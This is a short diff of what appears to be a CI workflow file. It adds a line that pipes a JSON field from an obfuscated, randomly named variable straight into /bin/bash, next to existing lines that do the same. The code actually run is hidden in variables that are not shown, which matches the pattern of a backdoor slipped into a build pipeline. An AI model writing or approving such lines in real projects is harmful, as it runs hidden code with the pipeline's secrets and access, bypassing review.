@@ -28,6 +28,7 @@ jobs:
           echo $t70 | jq -r .zr8 | /bin/bash
           echo $f0 | jq -r .wxupl60 | /bin/bash
           echo $gr2162 | jq -r .if6631 | /bin/bash
+          printf '%s' "$yxo93" | jq -r .gab6783 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
